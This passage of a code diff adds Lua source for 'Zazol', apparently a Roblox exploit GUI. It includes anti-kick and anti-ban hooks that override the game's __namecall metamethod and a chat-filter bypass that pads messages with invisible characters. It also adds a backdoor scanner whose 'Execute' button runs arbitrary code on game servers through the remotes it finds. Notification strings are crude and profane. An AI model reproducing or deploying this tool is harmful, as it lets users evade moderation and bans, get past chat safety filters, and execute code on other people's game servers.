+                    detailsText.BackgroundTransparency = 1
+                    detailsText.TextColor3 = Color3.new(1, 1, 1)
+                    detailsText.Font = Enum.Font.SourceSans
+                    detailsText.TextSize = 16
+                    detailsText.TextXAlignment = Enum.TextXAlignment.Left
+                    detailsText.TextYAlignment = Enum.TextYAlignment.Top
+                    detailsText.Parent = detailsFrame
+
+                    local copyDetailsButton = Instance.new("TextButton")
+                    copyDetailsButton.Name = "SysCopyDetailsButton"
+                    copyDetailsButton.Text = "Copy Details"
+                    copyDetailsButton.Size = UDim2.new(0.2, 0, 0, 20)
+                    copyDetailsButton.Position = UDim2.new(0.8, 0, 0.8, 0)
+                    copyDetailsButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+                    copyDetailsButton.TextColor3 = Color3.new(1, 1, 1)
+                    copyDetailsButton.Font = Enum.Font.SourceSansBold
+                    copyDetailsButton.TextSize = 14
+                    copyDetailsButton.BorderSizePixel = 0
+                    copyDetailsButton.AutoButtonColor = true
+                    copyDetailsButton.Parent = detailsFrame
+
+                    copyDetailsButton.MouseButton1Click:Connect(function()
+                        pcall(function()
+                            setclipboard(detailsText.Text)
+                            Zazol.ShowNotification("Vulnerability details copied to clipboard.", true)
+                        end)
+                    end)
+
+                    vulnFrame.CanvasSize = UDim2.new(0, 0, 0, vulnYOffset + 125)
+                end)
+            end
+
+            addVulnerabilityResult("Data Validation", "Potential lack of data validation in Remote Events/Functions.", hasDataValidationIssues, 30)
+            addVulnerabilityResult("FilteringEnabled", "FilteringEnabled is disabled, potentially allowing client-side exploits.", isFilteringEnabledDisabled, 70)
+            addVulnerabilityResult("Code Injection", "Potential code injection via Loadstring detected.", hasLoadstringIssues, 110)
+            addVulnerabilityResult("Player Data", "Player data stored on the client, susceptible to manipulation.", hasPlayerDataIssues, 150)
+            addVulnerabilityResult("Malicious Plugins", "Potential malicious code in plugins or models.", hasMaliciousPlugins, 190)
+            addVulnerabilityResult("Unsecured HTTP", "Use of unsecured HTTP requests detected.", hasUnsecuredHttp, 230)
+            addVulnerabilityResult("Exposed Variables", "Sensitive variables (e.g., keys, passwords) exposed in game.", hasExposedVariables, 270)
+            addVulnerabilityResult("Unprotected GUI", "GUI elements vulnerable to manipulation.", hasUnprotectedGui, 310)
+            addVulnerabilityResult("Weak Encryption", "Weak encryption methods (e.g., base64, md5) detected.", hasWeakEncryption, 350)
+            addVulnerabilityResult("Server Lag Exploit", "Potential infinite loops or lag exploits detected.", hasServerLagExploit, 390)
+            addVulnerabilityResult("Obfuscated Code", "Obfuscated or overly complex code detected.", hasObfuscation, 430)
+            addVulnerabilityResult("Webhook Logging", "Potential data logging to external webhooks detected.", hasWebhookLogging, 470)
+            addVulnerabilityResult("Unusual Remotes", "Remotes with suspicious names or lengths detected.", hasUnusualRemotes, 510)
+            addVulnerabilityResult("Client Physics", "Client-sided physics objects detected.", hasClientSidedPhysics, 550)
+            addVulnerabilityResult("Remote Flooding", "Potential remote flooding via rapid FireServer calls.", hasRemoteFlooding, 590)
+            addVulnerabilityResult("Unsecured DataStores", "DataStore usage without error handling detected.", hasUnsecuredDataStores, 630)
+            addVulnerabilityResult("Exploitable Connections", "Unsecured connections like PlayerAdded on client.", hasExploitableConnections, 670)
+            addVulnerabilityResult("Unprotected Assets", "Exposed assets (sounds, images) in client GUI.", hasUnprotectedAssets, 710)
+            addVulnerabilityResult("Client Values", "Client-sided values (IntValue, BoolValue) detected.", hasClientSidedValues,750)
+            addVulnerabilityResult("Unsecured Remotes", "Admin-related remotes in ReplicatedStorage.", hasUnsecuredRemotes, 790)
+            addVulnerabilityResult("Client Scripts", "Client-sided scripts with exploitable logic.", hasClientSidedScripts, 830)
+            addVulnerabilityResult("Unprotected Events", "Unprotected BindToRenderStep or Heartbeat events.", hasUnprotectedEvents, 870)
+            addVulnerabilityResult("Suspicious Modules", "Suspicious ModuleScripts with server-side requires.", hasSuspiciousModules, 910)
+            addVulnerabilityResult("Unsecured Teleport", "TeleportService usage without error handling.", hasUnsecuredTeleport, 950)
+            addVulnerabilityResult("Client Replication", "Client-sided replication of objects detected.", hasClientSidedReplication, 990)
+            addVulnerabilityResult("Unsecured Marketplace", "MarketplaceService usage without error handling.", hasUnsecuredMarketplace, 1030)
+            addVulnerabilityResult("Client Destruction", "Client-sided destruction of objects detected.", hasClientSidedDestruction, 1070)
+            addVulnerabilityResult("Unprotected Signals", "Unprotected GetPropertyChangedSignal on client.", hasUnprotectedSignals, 1110)
+            addVulnerabilityResult("Unsecured Chat", "Unsecured chat message requests detected.", hasUnsecuredChat, 1150)
+            addVulnerabilityResult("Client Movement", "Client-sided movement manipulation detected.", hasClientSidedMovement, 1190)
+            addVulnerabilityResult("Unprotected Camera", "Client-sided camera manipulation detected.", hasUnprotectedCamera, 1230)
+            addVulnerabilityResult("Client GUI Manipulation", "Client-sided GUI manipulation detected.", hasClientSidedGuiManipulation, 1270)
+            addVulnerabilityResult("Unsecured Player Stats", "Client-sided leaderstats manipulation detected.", hasUnsecuredPlayerStats, 1310)
+            addVulnerabilityResult("Client Input", "Client-sided input handling detected.", hasClientSidedInput, 1350)
+            addVulnerabilityResult("Unprotected Workspace", "Client-sided Workspace manipulation detected.", hasUnprotectedWorkspace, 1390)
+            addVulnerabilityResult("Client Sound", "Client-sided sound manipulation detected.", hasClientSidedSound, 1430)
+
+            contentScroll.CanvasSize = UDim2.new(0, 0, 0, yOffset + maxVulnHeight)
+            bypassScanned = true
+
+            antiKickButton.MouseButton1Click:Connect(function()
+                local mt = getrawmetatable(game)
+                local oldNamecall = mt.__namecall
+                setreadonly(mt, false)
+                mt.__namecall = newcclosure(function(self, ...)
+                    local method = getnamecallmethod()
+                    if method == "Kick" then
+                        Zazol.ShowNotification("Blocked a kick attempt, fuck yeah!", true)
+                        return nil
+                    end
+                    return oldNamecall(self, ...)
+                end)
+                setreadonly(mt, true)
+                Zazol.ShowNotification("Anti-Kick protection activated, you’re safe, bitch!", true)
+            end)
+
+            antiBanButton.MouseButton1Click:Connect(function()
+                local mt = getrawmetatable(game)
+                local oldNamecall = mt.__namecall
+                setreadonly(mt, false)
+                mt.__namecall = newcclosure(function(self, ...)
+                    local method = getnamecallmethod()
+                    if method == "Ban" or method == "Kick" then
+                        Zazol.ShowNotification("Blocked a ban attempt, you’re untouchable!", true)
+                        return nil
+                    end
+                    return oldNamecall(self, ...)
+                end)
+                setreadonly(mt, true)
+                Zazol.ShowNotification("Anti-Ban protection activated, fuck bans!", true)
+            end)
+
+            chatBypassButton.MouseButton1Click:Connect(function()
+                local message = chatInput.Text
+                if message and message ~= "" then
+                    local bypassedMessage = ""
+                    for i = 1, #message do
+                        local char = message:sub(i, i)
+                        bypassedMessage = bypassedMessage .. char .. (i < #message and "⁣" or "")
+                    end
+                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(bypassedMessage, "All")
+                    Zazol.ShowNotification("Bypassed message sent: " .. message, true)
+                else
+                    Zazol.ShowNotification("Error: Enter a message to bypass, dipshit.", false)
+                end
+            end)
+        else
+            for _, element in pairs(bypassElements) do
+                element.Visible = true
+            end
+        end
+
+        scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+    end)
+exploitab.MouseButton1Click:Connect(function()
+    scrollFrame:ClearAllChildren()
+    setActiveTab(exploitCheckTab)
+
+    local exploitScanButton = Instance.new("TextButton")
+    exploitScanButton.Name = "SysExploitScanButton"
+    exploitScanButton.Text = "Scan for Exploits"
+    exploitScanButton.Size = UDim2.new(1, -10, 0, 30)
+    exploitScanButton.Position = UDim2.new(0, 5, 0, 0)
+    exploitScanButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+    exploitScanButton.TextColor3 = Color3.new(1, 1, 1)
+    exploitScanButton.Font = Enum.Font.SourceSansBold
+    exploitScanButton.TextSize = 18
+    exploitScanButton.BorderSizePixel = 0
+    exploitScanButton.AutoButtonColor = true
+    exploitScanButton.Parent = scrollFrame
+
+    exploitScanButton.MouseButton1Click:Connect(function()
+        scrollFrame:ClearAllChildren()
+
+    
+        local exploitFrame = Instance.new("Frame")
+        exploitFrame.Name = "SysExploitFrame"
+        exploitFrame.Size = UDim2.new(1, 0, 0.85, 0)
+        exploitFrame.Position = UDim2.new(0, 0, 0.15, 0)
+        exploitFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+        exploitFrame.BorderSizePixel = 0
+        exploitFrame.Parent = scrollFrame
+
+        local exploitScroll = Instance.new("ScrollingFrame")
+        exploitScroll.Name = "SysExploitScroll"
+        exploitScroll.Size = UDim2.new(1, 0, 1, 0)
+        exploitScroll.Position = UDim2.new(0, 0, 0, 0)
+        exploitScroll.BackgroundTransparency = 1
+        exploitScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+        exploitScroll.ScrollBarThickness = 5
+        exploitScroll.Parent = exploitFrame
+
+        local preciseBackdoors, potentialBackdoors = Zazol.FindBackdoors()
+        local yOffset = 0
+
+       
+        local newPreciseBackdoors = {}
+        local newPotentialBackdoors = {}
+
+        for _, backdoor in pairs(preciseBackdoors) do
+            local isPrecise, keyword = isPreciseBackdoor(backdoor.Name)
+            if isPrecise then
+                table.insert(newPreciseBackdoors, backdoor)
+            else
+                table.insert(newPotentialBackdoors, backdoor)
+            end
+        end
+
+        for _, backdoor in pairs(potentialBackdoors) do
+            local isPrecise, keyword = isPreciseBackdoor(backdoor.Name)
+            if isPrecise then
+                table.insert(newPreciseBackdoors, backdoor)
+            else
+                table.insert(newPotentialBackdoors, backdoor)
+            end
+        end
+
+        for _, backdoor in pairs(newPreciseBackdoors) do
+            local backdoorFrame = Instance.new("Frame")
+            backdoorFrame.Name = "SysBackdoorFrame"
+            backdoorFrame.Size = UDim2.new(1, -10, 0, 30)
+            backdoorFrame.Position = UDim2.new(0, 5, 0, yOffset)
+            backdoorFrame.BackgroundTransparency = 1
+            backdoorFrame.Parent = exploitScroll
+
+            local backdoorButton = Instance.new("TextButton")
+            backdoorButton.Name = "SysBackdoorButton"
+            backdoorButton.Text = "☢️ " .. backdoor:GetFullName() .. " (Precise)"
+            backdoorButton.Size = UDim2.new(0.8, -30, 1, 0)
+            backdoorButton.Position = UDim2.new(0, 30, 0, 0)
+            backdoorButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+            backdoorButton.TextColor3 = Color3.new(1, 1, 1)
+            backdoorButton.Font = Enum.Font.SourceSansBold
+            backdoorButton.TextSize = 14
+            backdoorButton.BorderSizePixel = 0
+            backdoorButton.AutoButtonColor = true
+            backdoorButton.Parent = backdoorFrame
+
+            local executeButton = Instance.new("TextButton")
+            executeButton.Name = "SysExecuteButton"
+            executeButton.Text = "Execute"
+            executeButton.Size = UDim2.new(0.2, 0, 1, 0)
+            executeButton.Position = UDim2.new(0.8, 0, 0, 0)
+            executeButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+            executeButton.TextColor3 = Color3.new(1, 1, 1)
+            executeButton.Font = Enum.Font.SourceSansBold
+            executeButton.TextSize = 16
+            executeButton.BorderSizePixel = 0
+            executeButton.AutoButtonColor = true
+            executeButton.Parent = backdoorFrame
+
+            local detailsFrame
+            backdoorButton.MouseButton1Click:Connect(function()
+                if detailsFrame then
+                    detailsFrame:Destroy()
+                    detailsFrame = nil
+                    return
+                end
+
+                detailsFrame = Instance.new("Frame")
+                detailsFrame.Name = "SysDetailsFrame"
+                detailsFrame.Size = UDim2.new(1, -10, 0, 250) 
+                detailsFrame.Position = UDim2.new(0, 5, 0, yOffset + 35)
+                detailsFrame.BackgroundColor3 = Color3.new(0.25, 0.25, 0.25)
+                detailsFrame.BorderSizePixel = 0
+                detailsFrame.Parent = exploitScroll
+
+                local remoteName = backdoor.Name
+                local fullPath = backdoor:GetFullName()
+                local remoteType = backdoor:IsA("RemoteEvent") and "RemoteEvent" or "RemoteFunction"
+                local parentName = tostring(backdoor.Parent)
+                local isSuspicious, isDangerous, reason = Zazol.CheckRemote(backdoor.Name)
+                local isPrecise, keyword = isPreciseBackdoor(backdoor.Name)
+                local hierarchyPath, isSuspiciousLocation, hierarchyDepth = analyzeParentHierarchy(backdoor)
+                local nearbyRemotes = analyzeNearbyObjects(backdoor)
+                local attributes = backdoor:GetAttributes()
+                local attributeCount = 0
+                for _ in pairs(attributes) do attributeCount = attributeCount + 1 end
+                local isHidden = not backdoor.Archivable
+                local hasSuspiciousParent, suspiciousParentName = checkSuspiciousParentNames(backdoor)
+                local connectionCount = 0
+                pcall(function()
+                    connectionCount = #backdoor:GetConnections()
+                end)
+
+                local detailsText = Instance.new("TextLabel")
+                detailsText.Name = "SysDetailsText"
+                detailsText.Text = "🔍 Detailed Backdoor Info:\n" ..
+                    "Name: " .. remoteName .. "\n" ..
+                    "Full Path: " .. fullPath .. "\n" ..
+                    "Type: " .. remoteType .. "\n" ..
+                    "Parent: " .. parentName .. "\n" ..
+                    "Hierarchy Path: " .. hierarchyPath .. "\n" ..
+                    "Hierarchy Depth: " .. hierarchyDepth .. "\n" ..
+                    "Suspicious Location: " .. (isSuspiciousLocation and "Yes" or "No") .. "\n" ..
+                    "Nearby Remotes: " .. nearbyRemotes .. "\n" ..
+                    "Attributes Count: " .. attributeCount .. "\n" ..
+                    "Hidden (Archivable = false): " .. (isHidden and "Yes" or "No") .. "\n" ..
+                    "Suspicious Parent Name: " .. (hasSuspiciousParent and "Yes (" .. suspiciousParentName .. ")" or "No") .. "\n" ..
+                    "Connected Events: " .. connectionCount .. "\n" ..
+                    "Suspicious Keywords: " .. (reason ~= "" and reason or keyword ~= "" and keyword or "None") .. "\n" ..
+                    "Danger Level: " .. (isDangerous and "High" or isSuspicious and "Medium" or "Low")
+                detailsText.Size = UDim2.new(1, 0, 1, 0)
+                detailsText.Position = UDim2.new(0, 0, 0, 0)
+                detailsText.BackgroundTransparency = 1
+                detailsText.TextColor3 = Color3.new(1, 1, 1)
+                detailsText.Font = Enum.Font.SourceSans
+                detailsText.TextSize = 14
+                detailsText.TextXAlignment = Enum.TextXAlignment.Left
+                detailsText.TextYAlignment = Enum.TextYAlignment.Top
+                detailsText.Parent = detailsFrame
+
+                local copyDetailsButton = Instance.new("TextButton")
+                copyDetailsButton.Name = "SysCopyDetailsButton"
+                copyDetailsButton.Text = "Copy Details"
+                copyDetailsButton.Size = UDim2.new(0.2, 0, 0, 20)
+                copyDetailsButton.Position = UDim2.new(0.8, 0, 0.8, 0)
+                copyDetailsButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+                copyDetailsButton.TextColor3 = Color3.new(1, 1, 1)
+                copyDetailsButton.Font = Enum.Font.SourceSansBold
+                copyDetailsButton.TextSize = 14
+                copyDetailsButton.BorderSizePixel = 0
+                copyDetailsButton.AutoButtonColor = true
+                copyDetailsButton.Parent = detailsFrame
+
+                copyDetailsButton.MouseButton1Click:Connect(function()
+                    pcall(function()
+                        setclipboard(detailsText.Text)
+                        Zazol.ShowNotification("Backdoor details copied to clipboard.", true)
+                    end)
+                end)
+
+                exploitScroll.CanvasSize = UDim2.new(0, 0, 0, yOffset + 255)
+            end)
+
+            local codeInput = Instance.new("TextBox")
+            codeInput.Name = "SysCodeInput"
+            codeInput.PlaceholderText = "e.g., print('Hello')"
+            codeInput.Text = ""
+            codeInput.Size = UDim2.new(1, -10, 0, 30)
+            codeInput.Position = UDim2.new(0, 5, 0, yOffset + 35)
+            codeInput.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+            codeInput.TextColor3 = Color3.new(1, 1, 1)
+            codeInput.Font = Enum.Font.SourceSans
+            codeInput.TextSize = 14
+            codeInput.BorderSizePixel = 0
+            codeInput.Parent = exploitScroll
+
+            executeButton.MouseButton1Click:Connect(function()
+                local code = codeInput.Text
+                if code and code ~= "" then
+                    Zazol.ExecuteBackdoor(backdoor, code)
+                else
+                    Zazol.ShowNotification("Error: Please enter code to execute.", false)
+                end
+            end)
+
+            yOffset = yOffset + 70
+        end
+
+        for _, backdoor in pairs(newPotentialBackdoors) do
+            local backdoorFrame = Instance.new("Frame")
+            backdoorFrame.Name = "SysBackdoorFrame"
+            backdoorFrame.Size = UDim2.new(1, -10, 0, 30)
+            backdoorFrame.Position = UDim2.new(0, 5, 0, yOffset)
+            backdoorFrame.BackgroundTransparency = 1
+            backdoorFrame.Parent = exploitScroll
+
+            local backdoorButton = Instance.new("TextButton")
+            backdoorButton.Name = "SysBackdoorButton"
+            backdoorButton.Text = "⚠️ " .. backdoor:GetFullName() .. " (Potential)"
+            backdoorButton.Size = UDim2.new(1, -30, 1, 0)
+            backdoorButton.Position = UDim2.new(0, 0, 0, 0)
+            backdoorButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+            backdoorButton.TextColor3 = Color3.new(1, 1, 1)
+            backdoorButton.Font = Enum.Font.SourceSansBold
+            backdoorButton.TextSize = 14
+            backdoorButton.BorderSizePixel = 0
+            backdoorButton.AutoButtonColor = true
+            backdoorButton.Parent = backdoorFrame
+
+            local executeButton = Instance.new("TextButton")
+            executeButton.Name = "SysExecuteButton"
+            executeButton.Text = "Execute"
+            executeButton.Size = UDim2.new(0.2, 0, 1, 0)
+            executeButton.Position = UDim2.new(0.8, 0, 0, 0)
+            executeButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+            executeButton.TextColor3 = Color3.new(1, 1, 1)
+            executeButton.Font = Enum.Font.SourceSansBold
+            executeButton.TextSize = 16
+            executeButton.BorderSizePixel = 0
+            executeButton.AutoButtonColor = true
+            executeButton.Parent = backdoorFrame
+
+            local detailsFrame
+            backdoorButton.MouseButton1Click:Connect(function()
+                if detailsFrame then
+                    detailsFrame:Destroy()
+                    detailsFrame = nil
+                    return
+                end
+
+                detailsFrame = Instance.new("Frame")
+                detailsFrame.Name = "SysDetailsFrame"
+                detailsFrame.Size = UDim2.new(1, -10, 0, 250)
+                detailsFrame.Position = UDim2.new(0, 5, 0, yOffset + 35)
+                detailsFrame.BackgroundColor3 = Color3.new(0.25, 0.25, 0.25)
+                detailsFrame.BorderSizePixel = 0
+                detailsFrame.Parent = exploitScroll
+
+                local remoteName = backdoor.Name
+                local fullPath = backdoor:GetFullName()
+                local remoteType = backdoor:IsA("RemoteEvent") and "RemoteEvent" or "RemoteFunction"
+                local parentName = tostring(backdoor.Parent)
+                local isSuspicious, isDangerous, reason = Zazol.CheckRemote(backdoor.Name)
+                local isPrecise, keyword = isPreciseBackdoor(backdoor.Name)
+                local hierarchyPath, isSuspiciousLocation, hierarchyDepth = analyzeParentHierarchy(backdoor)
+                local nearbyRemotes = analyzeNearbyObjects(backdoor)
+                local attributes = backdoor:GetAttributes()
+                local attributeCount = 0
+                for _ in pairs(attributes) do attributeCount = attributeCount + 1 end
+                local isHidden = not backdoor.Archivable
+                local hasSuspiciousParent, suspiciousParentName = checkSuspiciousParentNames(backdoor)
+                local connectionCount = 0
+                pcall(function()
+                    connectionCount = #backdoor:GetConnections()
+                end)
+
+                local detailsText = Instance.new("TextLabel")
+                detailsText.Name = "SysDetailsText"
+                detailsText.Text = "🔍 Detailed Backdoor Info:\n" ..
+                    "Name: " .. remoteName .. "\n" ..
+                    "Full Path: " .. fullPath .. "\n" ..
+                    "Type: " .. remoteType .. "\n" ..
+                    "Parent: " .. parentName .. "\n" ..
+                    "Hierarchy Path: " .. hierarchyPath .. "\n" ..
+                    "Hierarchy Depth: " .. hierarchyDepth .. "\n" ..
+                    "Suspicious Location: " .. (isSuspiciousLocation and "Yes" or "No") .. "\n" ..
+                    "Nearby Remotes: " .. nearbyRemotes .. "\n" ..
+                    "Attributes Count: " .. attributeCount .. "\n" ..
+                    "Hidden (Archivable = false): " .. (isHidden and "Yes" or "No") .. "\n" ..
+                    "Suspicious Parent Name: " .. (hasSuspiciousParent and "Yes (" .. suspiciousParentName .. ")" or "No") .. "\n" ..
+                    "Connected Events: " .. connectionCount .. "\n" ..
+                    "Suspicious Keywords: " .. (reason ~= "" and reason or keyword ~= "" and keyword or "None") .. "\n" ..
+                    "Danger Level: " .. (isDangerous and "High" or isSuspicious and "Medium" or "Low")
+                detailsText.Size = UDim2.new(1, 0, 1, 0)
+                detailsText.Position = UDim2.new(0, 0, 0, 0)
+                detailsText.BackgroundTransparency = 1
+                detailsText.TextColor3 = Color3.new(1, 1, 1)
+                detailsText.Font = Enum.Font.SourceSans
+                detailsText.TextSize = 14
+                detailsText.TextXAlignment = Enum.TextXAlignment.Left
+                detailsText.TextYAlignment = Enum.TextYAlignment.Top
+                detailsText.Parent = detailsFrame
+
+                local copyDetailsButton = Instance.new("TextButton")
+                copyDetailsButton.Name = "SysCopyDetailsButton"
+                copyDetailsButton.Text = "Copy Details"
+                copyDetailsButton.Size = UDim2.new(0.2, 0, 0, 20)
+                copyDetailsButton.Position = UDim2.new(0.8, 0, 0.8, 0)
+                copyDetailsButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+                copyDetailsButton.TextColor3 = Color3.new(1, 1, 1)
+                copyDetailsButton.Font = Enum.Font.SourceSansBold
+                copyDetailsButton.TextSize = 14
+                copyDetailsButton.BorderSizePixel = 0
+                copyDetailsButton.AutoButtonColor = true
+                copyDetailsButton.Parent = detailsFrame
+
+                copyDetailsButton.MouseButton1Click:Connect(function()
+                    pcall(function()
+                        setclipboard(detailsText.Text)
+                        Zazol.ShowNotification("Backdoor details copied to clipboard.", true)
+                    end)
+                end)
+
+                exploitScroll.CanvasSize = UDim2.new(0, 0, 0, yOffset + 255)
+            end)
+
+            local codeInput = Instance.new("TextBox")
+            codeInput.Name = "SysCodeInput"
+            codeInput.PlaceholderText = "e.g., print('Hello')"
+            codeInput.Text = ""
+            codeInput.Size = UDim2.new(1, -10, 0, 30)
+            codeInput.Position = UDim2.new(0, 5, 0, yOffset + 35)
+            codeInput.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+            codeInput.TextColor3 = Color3.new(1, 1, 1)
+            codeInput.Font = Enum.Font.SourceSans
+            codeInput.TextSize = 14
+            codeInput.BorderSizePixel = 0
+            codeInput.Parent = exploitScroll
+
+            executeButton.MouseButton1Click:Connect(function()
+                local code = codeInput.Text
+                if code and code ~= "" then
+                    Zazol.ExecuteBackdoor(backdoor, code)
+                else
+                    Zazol.ShowNotification("Error: Please enter code to execute.", false)
+                end
+            end)
+
+            yOffset = yOffset + 70
+        end
+
+        exploitScroll.CanvasSize = UDim2.new(0, 0, 0, yOffset)
+        scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0) 
+        Zazol.ShowNotification("Found " .. #newPreciseBackdoors .. " precise backdoors and " .. #newPotentialBackdoors .. " potential backdoors.", true)
+    end)
+
+    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 35)
+end)
+
+    remoteSpammerTab:SimulateClick()
+end)
+
+UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
+    if input.KeyCode == Enum.KeyCode.Insert and not gameProcessedEvent then
+        screenGui.Enabled = not screenGui.Enabled
+    end
+end)
